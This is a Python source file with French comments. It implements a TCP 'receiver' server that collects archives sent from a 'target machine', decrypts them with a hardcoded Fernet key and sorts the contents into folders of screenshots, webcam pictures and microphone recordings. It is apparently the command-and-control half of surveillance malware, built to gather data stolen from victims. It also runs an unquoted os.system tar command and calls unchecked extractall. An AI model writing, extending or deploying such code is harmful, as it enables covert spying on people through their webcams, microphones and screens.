import socket
import os
import tarfile
from pathlib import Path
import threading
import time
from cryptography.fernet import Fernet
import shutil
import hashlib

class FixedReceiverServer:
    def __init__(self, host='0.0.0.0', port=8888):
        self.host = host
        self.port = port
        self.receive_dir = Path.home() / 'received_data'
        self.key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='
        self.running = True
        self.ensure_data_dir()
        
    def ensure_data_dir(self):
        """Crée le dossier de données s'il n'existe pas"""
        self.receive_dir.mkdir(exist_ok=True)
        
    def decrypt_file(self, encrypted_file, output_file):
        """Déchiffre un fichier"""
        try:
            with open(encrypted_file, 'rb') as f:
                encrypted_data = f.read()
            
            decrypted_data = Fernet(self.key).decrypt(encrypted_data)
            
            with open(output_file, 'wb') as f:
                f.write(decrypted_data)
            
            print(f"✅ Déchiffré: {encrypted_file.name} → {output_file.name}")
            return True
            
        except Exception as e:
            print(f"❌ Erreur déchiffrement {encrypted_file.name}: {e}")
            return False
    
    def safe_extract_archive(self, archive_path, extract_dir):
        """Extrait une archive avec gestion d'erreurs robuste"""
        try:
            # Vérifier que l'archive existe et n'est pas vide
            if not archive_path.exists():
                print(f"❌ Archive non trouvée: {archive_path}")
                return False
                
            if archive_path.stat().st_size == 0:
                print(f"❌ Archive vide: {archive_path}")
                return False
            
            # Essayer d'extraire avec différentes méthodes
            try:
                with tarfile.open(archive_path, 'r:gz') as tar:
                    tar.extractall(path=extract_dir)
                print(f"✅ Archive extraite avec succès")
                return True
                
            except tarfile.ReadError:
                print("❌ Erreur lecture archive, tentative de réparation...")
                # Tentative alternative
                try:
                    os.system(f"tar -xzf {archive_path} -C {extract_dir} 2>/dev/null")
                    if any(extract_dir.iterdir()):
                        print("✅ Archive réparée et extraite")
                        return True
                    else:
                        print("❌ Échec réparation archive")
                        return False
                except:
                    return False
                    
        except Exception as e:
            print(f"❌ Erreur extraction archive: {e}")
            return False
    
    def process_received_data(self, extract_dir):
        """Traite les données reçues : déchiffrement et organisation"""
        print(f"🔧 Traitement des données dans {extract_dir}")
        
        # Déchiffrer tous les fichiers commençant par 'e_'
        decrypted_count = 0
        for encrypted_file in extract_dir.glob('e_*'):
            if encrypted_file.is_file():
                clear_name = encrypted_file.name[2:]  # Enlève le 'e_'
                clear_file = extract_dir / clear_name
                
                if self.decrypt_file(encrypted_file, clear_file):
                    # Supprimer le fichier chiffré après déchiffrement réussi
                    encrypted_file.unlink()
                    decrypted_count += 1
        
        print(f"🔓 {decrypted_count} fichiers déchiffrés")
        
        # Réorganiser les dossiers de médias
        self.organize_media_files(extract_dir)
        
        print(f"✅ Traitement terminé pour {extract_dir.name}")
    
    def organize_media_files(self, extract_dir):
        """Réorganise les fichiers médias dans des dossiers appropriés"""
        # Screenshots
        screenshots = list(extract_dir.glob('*screenshot*'))
        if screenshots:
            screenshot_dir = extract_dir / 'Screenshots'
            screenshot_dir.mkdir(exist_ok=True)
            for screenshot in screenshots:
                if screenshot.is_file():
                    try:
                        shutil.move(str(screenshot), str(screenshot_dir / screenshot.name))
                        print(f"🖼 Screenshot déplacé: {screenshot.name}")
                    except Exception as e:
                        print(f"⚠ Erreur déplacement screenshot: {e}")
        
        # Webcam
        webcam_pics = list(extract_dir.glob('*webcam*'))
        if webcam_pics:
            webcam_dir = extract_dir / 'WebcamPics'
            webcam_dir.mkdir(exist_ok=True)
            for pic in webcam_pics:
                if pic.is_file():
                    try:
                        shutil.move(str(pic), str(webcam_dir / pic.name))
                        print(f"📷 Webcam déplacé: {pic.name}")
                    except Exception as e:
                        print(f"⚠ Erreur déplacement webcam: {e}")
        
        # Audio
        audio_files = list(extract_dir.glob('*mic_recording*')) + list(extract_dir.glob('*recording*'))
        if audio_files:
            audio_dir = extract_dir / 'Audio'
            audio_dir.mkdir(exist_ok=True)
            for audio in audio_files:
                if audio.is_file():
                    try:
                        shutil.move(str(audio), str(audio_dir / audio.name))
                        print(f"🎵 Audio déplacé: {audio.name}")
                    except Exception as e:
                        print(f"⚠ Erreur déplacement audio: {e}")
    
    def handle_client(self, conn, addr):
        """Gère une connexion client avec gestion d'erreurs améliorée"""
        print(f"🔗 Connexion de {addr}")
        
        archive_path = None
        try:
            # Recevoir la taille du fichier
            file_size_bytes = conn.recv(8)
            if not file_size_bytes or len(file_size_bytes) != 8:
                print("❌ Taille de fichier invalide reçue")
                return
                
            file_size = int.from_bytes(file_size_bytes, byteorder='big')
            print(f"📦 Taille annoncée: {file_size} octets")
            
            # Créer un nom de fichier unique
            timestamp = int(time.time())
            archive_path = self.receive_dir / f"received_{timestamp}.tar.gz"
            
            # Recevoir le fichier avec vérification
            received = 0
            with open(archive_path, 'wb') as f:
                while received < file_size:
                    # Lire par chunks avec timeout
                    conn.settimeout(10.0)
                    chunk = conn.recv(min(8192, file_size - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            
            # Vérifier la réception complète
            actual_size = archive_path.stat().st_size if archive_path.exists() else 0
            print(f"📊 Taille reçue: {actual_size}/{file_size} octets")
            
            if received == file_size and actual_size == file_size:
                print(f"✅ Archive reçue: {archive_path.name} ({file_size} bytes)")
                
                # Extraire l'archive
                extract_dir = self.receive_dir / f"data_{timestamp}"
                extract_dir.mkdir(exist_ok=True)
                
                if self.safe_extract_archive(archive_path, extract_dir):
                    # Traiter les données (déchiffrement + organisation)
                    self.process_received_data(extract_dir)
                    
                    # Lister les fichiers finaux
                    final_files = list(extract_dir.rglob('*'))
                    print(f"📁 Fichiers finaux: {len(final_files)}")
                    for file in final_files:
                        if file.is_file():
                            size = file.stat().st_size
                            print(f"   📄 {file.relative_to(extract_dir)} ({size} octets)")
                else:
                    print("❌ Échec extraction, conservation de l'archive")
                    return
                
            else:
                print(f"❌ Transfert incomplet: {received}/{file_size} bytes")
                if archive_path.exists():
                    archive_path.unlink()
                return
                
        except socket.timeout:
            print("⏰ Timeout lors de la réception")
            if archive_path and archive_path.exists():
                archive_path.unlink()
        except Exception as e:
            print(f"❌ Erreur avec {addr}: {e}")
            if archive_path and archive_path.exists():
                archive_path.unlink()
        finally:
            try:
                conn.close()
            except:
                pass
    
    def start(self):
        """Démarre le serveur"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            server_socket.settimeout(1)
            
            print(f"🎯 Serveur en écoute sur {self.host}:{self.port}")
            print("📁 Données reçues dans:", self.receive_dir)
            print("🔒 Déchiffrement automatique: ACTIVÉ")
            print("🛡  Gestion d'erreurs: ACTIVÉE")
            print("⏳ En attente de données de la machine cible...")
            
            while self.running:
                try:
                    conn, addr = server_socket.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client, 
                        args=(conn, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    print("\n⏹ Arrêt du serveur...")
                    break
                except Exception as e:
                    print(f"❌ Erreur serveur: {e}")
                    continue

if __name__ == '__main__':
    server = FixedReceiverServer()
    server.start()